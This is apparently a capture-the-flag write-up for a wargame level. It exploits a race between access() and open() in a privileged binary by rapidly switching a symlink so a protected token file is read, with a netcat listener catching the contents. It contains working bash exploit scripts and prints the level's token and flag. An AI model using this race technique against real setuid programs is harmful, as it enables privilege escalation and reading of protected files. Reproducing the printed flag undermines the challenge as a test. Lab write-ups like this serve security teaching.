
# Security hole between open & access

Looking at the program, it uses the **`access()`** function to check access to the input file. If the function is successfully called, an open is made and the content is sent to port **`6969`**.

![enter image description here](https://i.imgur.com/sZOk779.png)
*Applies access on the file passed in ARGV 1*

![enter image description here](https://i.imgur.com/QSLNkBt.png)
*Socket init*

![enter image description here](https://i.imgur.com/pELDYDo.png)
*Send a msg to the server, print a connection log, open the file, read its contents & attach it afterwards.*

I based my solution on this explanation in order to exploit an open window between access & open. 
[https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole](https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole)

To start a background process, **just add the character & at the end of the command**, the PID will be displayed at launch to be able to KILL afterwards. Launch the telnet server first, then the script to change symbolic link, and 
finally you launch the program in a loop in order to get the flag, don't forget to create the **`/tmp/fake_tok`** file.

```bash
#!/bin/bash
# Script to exploit a race condition between access & open.

while true; do
	ln -sf /tmp/fake_tok /tmp/tok ;
	ln -sf /home/user/level10/token /tmp/tok ;
done
```

```bash
#!/bin/bash
# Telnet server

start_telnet_server()
{
    while true; do
        nc -l 6969
    done
}
start_telnet_server
```

```bash
#!/bin/bash
# Random Brute force

while true; do
	/home/user/level10/level10 /tmp/tok 127.0.0.1 ;
done
```

> Token : `woupa2yuojeeaaed06riuj63c`

> Flag : `feulo4b72j7edeahuete3no7c`
